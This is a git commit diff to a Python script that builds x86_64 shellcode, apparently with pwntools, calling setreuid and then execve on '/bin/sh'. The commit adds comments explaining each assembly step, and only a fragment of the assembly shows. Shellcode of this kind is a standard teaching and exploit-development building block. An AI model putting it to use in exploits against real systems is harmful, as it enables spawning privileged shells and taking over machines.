ec0672e2a41e75e632e2345b57dd0245b2af44b6
Pugal Selvan V <86313268+Pugal09@users.noreply.github.com>
2022-08-29 11:03:04 +0530

    Update setreuid-exeve-bin-sh-x86_64.py

--- setreuid-exeve-bin-sh-x86_64.py
+++ setreuid-exeve-bin-sh-x86_64.py
@@ -20,6 +20,12 @@ pop rdi
 mov al, 0x3b                            
 syscall
 """
+# line 6 to 12: To make rax,rsi,rdi and rdx null.
+# line 13: Moving the syscall number of setreuid() into rax.
+# line 15: moving "A/bin/sh" into rcx.
+# line 16: shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00".
+# line 17 to 19: Moving the pointer which points to "/bin/sh\x00" into rdi.
+# line 20 : Moving the syscall number of execve() into rax.
 
 shellcode = asm(shellcode)
 log.info(f"bytes of the shellcode: {shellcode}")            
